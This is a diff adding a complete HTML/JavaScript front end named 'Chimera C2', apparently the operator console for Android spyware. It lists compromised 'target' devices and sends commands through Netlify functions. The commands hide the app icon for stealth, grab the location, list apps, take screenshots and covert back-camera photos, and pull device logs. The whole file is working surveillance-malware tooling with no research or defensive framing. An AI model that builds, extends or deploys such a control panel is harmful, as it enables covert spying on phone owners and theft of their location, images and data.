@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chimera C2</title>
+    <style>
+        :root {
+            --background-color: #0d1117;
+            --primary-text: #c9d1d9;
+            --secondary-text: #8b949e;
+            --border-color: #30363d;
+            --accent-color: #58a6ff;
+            --success-color: #3fb950;
+            --error-color: #f85149;
+            --console-bg: #010409;
+            --font-family: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            background-color: var(--background-color);
+            color: var(--primary-text);
+            font-family: var(--font-family);
+            margin: 0;
+            padding: 20px;
+            font-size: 14px;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            grid-template-rows: auto 1fr;
+            gap: 20px;
+            height: calc(100vh - 40px);
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        header {
+            grid-column: 1 / -1;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+        }
+
+        header h1 {
+            margin: 0;
+            color: var(--primary-text);
+        }
+
+        .panel {
+            background-color: var(--console-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 15px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .panel-title {
+            margin: 0 0 15px 0;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            font-weight: bold;
+            color: var(--accent-color);
+        }
+
+        #devices-panel {
+            grid-row: 2 / 3;
+        }
+
+        #device-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        #device-list li {
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 5px;
+            word-wrap: break-word;
+        }
+
+        #device-list li:hover {
+            background-color: #1a222c;
+        }
+
+        #device-list li.selected {
+            background-color: var(--accent-color);
+            color: var(--console-bg);
+            font-weight: bold;
+        }
+
+        #main-panel {
+            grid-row: 2 / 3;
+            display: grid;
+            grid-template-rows: auto 1fr;
+            gap: 20px;
+        }
+
+        #command-panel, #console-panel {
+            background-color: var(--console-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 15px;
+            overflow-y: auto;
+        }
+
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+        }
+
+        .command-group {
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 10px;
+        }
+
+        .command-group h4 {
+            margin: 0 0 10px 0;
+            font-size: 1em;
+            color: var(--secondary-text);
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #21262d;
+            border: 1px solid var(--border-color);
+            color: var(--primary-text);
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: var(--font-family);
+        }
+
+        button:hover {
+            border-color: var(--accent-color);
+        }
+
+        button:disabled {
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        input[type="text"], input[type="number"] {
+            width: calc(100% - 20px);
+            padding: 8px;
+            background-color: var(--background-color);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            color: var(--primary-text);
+            margin-top: 5px;
+            font-family: var(--font-family);
+        }
+
+        #console-output {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        #console-output .log-info { color: var(--primary-text); }
+        #console-output .log-success { color: var(--success-color); }
+        #console-output .log-error { color: var(--error-color); }
+        #console-output .log-cmd { color: var(--accent-color); }
+        #console-output .log-data { color: #f0f0f0; background-color: #1e1e1e; padding: 5px; border-radius: 3px; margin-top: 5px; display: block; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>Chimera C2</h1>
+        </header>
+
+        <div id="devices-panel" class="panel">
+            <h3 class="panel-title">DEVICES</h3>
+            <ul id="device-list">
+                <!-- Devices will be populated by JavaScript -->
+            </ul>
+        </div>
+
+        <div id="main-panel">
+            <div id="command-panel">
+                <h3 class="panel-title" id="command-panel-title">COMMANDS (No Target Selected)</h3>
+                <div class="command-grid">
+                    <div class="command-group">
+                        <h4>Stealth</h4>
+                        <button id="btnHideIcon">Hide Icon</button>
+                        <button id="btnShowIcon" style="margin-top:10px;">Show Icon</button>
+                    </div>
+                    <div class="command-group">
+                        <h4>System</h4>
+                        <button id="btnGetLocation">Get Location</button>
+                        <button id="btnListApps" style="margin-top:10px;">List Apps</button>
+                    </div>
+                     <div class="command-group">
+                        <h4>Surveillance</h4>
+                        <button id="btnScreenshot">Take Screenshot</button>
+                        <button id="btnTakePicture" style="margin-top:10px;">Take Picture (Back)</button>
+                    </div>
+                    <div class="command-group">
+                        <h4>Data Control</h4>
+                        <button id="btnFetchData">Fetch Device Logs</button>
+                        <button id="btnClearConsole" style="margin-top:10px;">Clear Console</button>
+                    </div>
+                </div>
+            </div>
+            <div id="console-panel">
+                <h3 class="panel-title">CONSOLE</h3>
+                <div id="console-output"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const deviceList = document.getElementById('device-list');
+        const commandPanelTitle = document.getElementById('command-panel-title');
+        const consoleOutput = document.getElementById('console-output');
+        
+        const API_BASE = '/.netlify/functions';
+        let devices = [];
+        let selectedDevice = null;
+        
+        function logToConsole(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-${type}`;
+            logEntry.innerHTML = `<span>[${timestamp}]</span> ${message}`;
+            consoleOutput.appendChild(logEntry);
+            consoleOutput.scrollTop = consoleOutput.scrollHeight;
+        }
+
+        async function fetchDevices() {
+            logToConsole('Fetching device list...');
+            try {
+                const response = await fetch(`${API_BASE}/get-devices`);
+                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
+                
+                devices = await response.json();
+                renderDeviceList();
+                logToConsole(`Success: Found ${devices.length} devices.`, 'success');
+            } catch (error) {
+                logToConsole(`Error fetching devices: ${error.message}`, 'error');
+            }
+        }
+
+        function renderDeviceList() {
+            deviceList.innerHTML = '';
+            devices.forEach(device => {
+                const li = document.createElement('li');
+                li.textContent = device.deviceId;
+                li.dataset.deviceId = device.deviceId;
+                li.dataset.token = device.token;
+                li.onclick = () => selectDevice(device, li);
+                deviceList.appendChild(li);
+            });
+        }
+
+        function selectDevice(device, element) {
+            selectedDevice = device;
+            document.querySelectorAll('#device-list li').forEach(li => li.classList.remove('selected'));
+            element.classList.add('selected');
+            commandPanelTitle.textContent = `COMMANDS (Target: ${device.deviceId.substring(0, 16)}...)`;
+            logToConsole(`Selected target: ${device.deviceId}`, 'info');
+            enableCommands(true);
+        }
+
+        function enableCommands(enabled) {
+            document.querySelectorAll('#command-panel button').forEach(btn => {
+                if(btn.id !== 'btnClearConsole') {
+                   btn.disabled = !enabled;
+                }
+            });
+        }
+
+        async function sendCommand(action, payload = {}) {
+            if (!selectedDevice) {
+                logToConsole('Cannot send command: No target selected.', 'error');
+                return;
+            }
+
+            const commandPayload = {
+                token: selectedDevice.token,
+                action: action,
+                ...payload
+            };
+
+            logToConsole(`Sending command [${action}] to ${selectedDevice.deviceId}...`, 'cmd');
+
+            try {
+                const response = await fetch(`${API_BASE}/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(commandPayload)
+                });
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(result.error || `Server responded with ${response.status}`);
+                }
+
+                logToConsole(`Command [${action}] successfully sent.`, 'success');
+
+            } catch (error) {
+                logToConsole(`Failed to send command [${action}]: ${error.message}`, 'error');
+            }
+        }
+        
+        async function fetchDeviceData() {
+            if (!selectedDevice) {
+                logToConsole('Cannot fetch data: No target selected.', 'error');
+                return;
+            }
+            logToConsole(`Fetching logs for ${selectedDevice.deviceId}...`, 'info');
+             try {
+                const response = await fetch(`${API_BASE}/get-device-data?deviceId=${selectedDevice.deviceId}`);
+                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
+                
+                const data = await response.json();
+                logToConsole(`Received ${data.length} log entries.`, 'success');
+                data.forEach(item => {
+                    const dataPayload = JSON.stringify(item.payload, null, 2);
+                    logToConsole(`[${item.dataType}] at ${new Date(item.timestamp).toLocaleString()}<pre class="log-data">${dataPayload}</pre>`, 'data');
+                });
+
+            } catch (error) {
+                logToConsole(`Error fetching device data: ${error.message}`, 'error');
+            }
+        }
+
+        // --- Event Listeners ---
+        document.getElementById('btnHideIcon').addEventListener('click', () => sendCommand('toggle_icon', { show: 'false' }));
+        document.getElementById('btnShowIcon').addEventListener('click', () => sendCommand('toggle_icon', { show: 'true' }));
+        document.getElementById('btnGetLocation').addEventListener('click', () => sendCommand('get_location'));
+        document.getElementById('btnListApps').addEventListener('click', () => sendCommand('list_apps'));
+        document.getElementById('btnScreenshot').addEventListener('click', () => sendCommand('screenshot'));
+        document.getElementById('btnTakePicture').addEventListener('click', () => sendCommand('picture', { camera_id: '0' }));
+        
+        document.getElementById('btnFetchData').addEventListener('click', fetchDeviceData);
+        document.getElementById('btnClearConsole').addEventListener('click', () => {
+            consoleOutput.innerHTML = '';
+            logToConsole('Console cleared.');
+        });
+        
+        // --- Initial Load ---
+        window.onload = () => {
+            logToConsole('C2 Interface Initialized.');
+            enableCommands(false);
+            fetchDevices();
+        };
+
+    </script>
+</body>
+</html>
